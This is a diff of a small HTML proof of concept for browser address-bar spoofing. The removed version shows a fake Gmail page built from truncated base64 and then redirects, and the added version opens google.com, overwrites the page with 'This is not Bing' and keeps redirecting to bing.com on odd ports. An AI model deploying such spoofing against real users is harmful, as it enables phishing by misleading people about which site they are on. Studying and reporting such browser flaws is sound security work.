@@ -1,18 +1,24 @@
+<!DOCTYPE html>
 <html>
-<head>
-  <title>try1ng</title>
-</head>
-<body>
-<script>
-function spoof()
-{
-var gmail = 'PCFET0NC8+KArOK........ZHk+PC9odG1sPg=='; //The base64 encoded version of the Gmail page
-x=document.body.innerHTML=atob(gmail);
-document.write("<title>Gmail</title>");
-document.write("x");
-window.location.assign("https://www.Gmail.com:8080");
-}
-setInterval(spoof(),100000);
-</script>
-</body>
+  <body>
+    <button onclick="spoof()">Run PoC</button>
+
+    <script>
+      function spoof() {
+        // Open target URL (spoofed address bar)
+        let win = window.open("https://www.google.com/", "_blank");
+
+        // Inject content before navigation commits
+        setTimeout(() => {
+          try {
+            document.write("<h1>This is not Bing</h1>");
+    location.href = "https://bing.com:8081";
+    setInterval(function(){location.href="https://bing.com:8080"},2000);
+          } catch (e) {
+            console.log(e);
+          }
+        }, 50);
+      }
+    </script>
+  </body>
 </html>
